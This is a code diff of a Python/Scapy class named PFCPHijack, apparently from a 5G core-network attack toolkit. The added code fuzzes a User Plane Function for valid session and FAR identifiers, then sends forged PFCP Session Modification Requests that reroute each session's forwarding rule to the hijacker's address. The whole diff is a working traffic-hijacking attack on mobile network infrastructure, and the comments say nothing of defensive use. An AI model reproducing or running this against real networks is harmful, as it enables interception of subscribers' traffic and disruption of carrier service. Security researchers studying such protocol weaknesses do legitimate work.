@@ -7,17 +7,19 @@ from scapy.contrib.pfcp import *
 from utils.handleParams import HandleParams
 from utils.logger import Log
 
+from pfcpFuzzer import PFCPFuzzer
+
 
 class PFCPHijack:
-    def __init__(self, src_addr, dest_addr, src_port, dest_port, seid, verbose=False):
-        self.src_addr = src_addr
-        self.dest_addr = dest_addr
+    def __init__(self, verbose=False, hijacker_addr=None, upf_addr=None, src_port=None, dest_port=None):
+        self.hijacker_addr = hijacker_addr
+        self.upf_addr = upf_addr
         self.src_port = src_port
         self.dest_port = dest_port
-        self.seid = seid
-        self.paramsHandler = HandleParams()
+        
         self.class_prefix="[PFCP-HIJACK]"
-        self.paramsHandler.basePrefix(self.class_prefix)
+        self.paramsHandler = HandleParams(self.class_prefix)
+        self.logger = Log(self.class_prefix)
         self.verbose = verbose
 
     def set_verbose(self, verbose):
@@ -27,34 +29,75 @@ class PFCPHijack:
         self.verbose = verbose
         
     
-    def Start_PFCP_hijack_far_manipulation(self,hijacker_addr,  src_addr=None, dest_addr=None, src_port=None, dest_port=None, seid=None):
+    def Start_PFCP_hijack_far_manipulation(self,hijacker_addr, upf_addr, src_port=None, dest_port=None, seid=None):
         """
         Start PFCP hijack far manipulation
         """
-        src_addr = src_addr or self.src_addr
-        dest_addr = dest_addr or self.dest_addr
+        hijacker_addr = hijacker_addr or self.hijacker_addr
+        upf_addr = upf_addr or self.upf_addr
         src_port = src_port or self.src_port
         dest_port = dest_port or self.dest_port
-        seid = seid or self.seid
+
         
         self.paramsHandler.check_parameters({
-            "src_addr": src_addr,
-            "dest_addr": dest_addr,
+            "hijacker_addr": hijacker_addr,
+            "upf_addr": upf_addr,
             "src_port": src_port,
             "dest_port": dest_port,
-            "seid": seid
+
         }, "[Start_PFCP_hijack_far_manipulation]")
                 
         PFCPToolkit_obj = PFCPToolkit(
-            src_addr=src_addr or self.src_addr,
-            dest_addr=dest_addr or self.dest_addr,
-            src_port=src_port or self.src_port,
-            dest_port=dest_port or self.dest_port,
-            seid=seid or self.seid
+            src_addr=hijacker_addr,
+            dest_addr=upf_addr,
+            src_port=src_port,
+            dest_port=dest_port,
+            seid=seid
         )
+        
+        
+    
+        PFCPFuzzer_obj = PFCPFuzzer()
+        PFCPFuzzer_obj.set_verbose(self.verbose)
+        valid_farids = PFCPFuzzer_obj.Start_PFCP_FARID_fuzzing(
+            upf_addr=upf_addr,
+            src_addr=hijacker_addr,
+            max_seid=seid,
+            max_far_discover=100,
+            src_port=src_port,
+            dest_port=dest_port,
+            seid=seid
+        )
+
         PFCPToolkit_obj.verbose(self.verbose)
+        teid = random.randint(1, 100000)
+        for seid, farid_list in valid_farids.items():
+            self.logger.info(f"Valid FAR IDs for SEID {seid}:")
+            for farid in farid_list:
+                self.logger.info(f"Valid FAR ID: {farid}")
+                packet = PFCPToolkit_obj.Build_PFCP_session_modification_req(seid=seid, far_id=farid, tdest_addr=hijacker_addr, teid=teid)
+                send(packet)
         
-        PFCPToolkit_obj.Send_PFCP_session_modification_req()
         
-        # Send the packet
-        send(packet)
+        # for far_id in valid_farids:
+        #     # Create a PFCP session modification request
+        #     packet = PFCPToolkit_obj.Build_PFCP_session_modification_req(seid=seid, far_id=far_id)
+            
+        #     # Send the packet
+        #     self.logger.info(f"Sending PFCP session modification request with SEID {seid} and FAR ID {far_id}")
+            
+        #     # Send the packet
+        #     send(packet)
+            
+        #     # Wait for a response
+        #     response = sr1(packet)
+            
+        #     if response:
+        #         self.logger.success(f"Received response: {response.summary()}")
+        #     else:
+        #         self.logger.error("No response received")
+        
+        # PFCPToolkit_obj.Send_PFCP_session_modification_req()
+        
+        # # Send the packet
+        # send(packet)
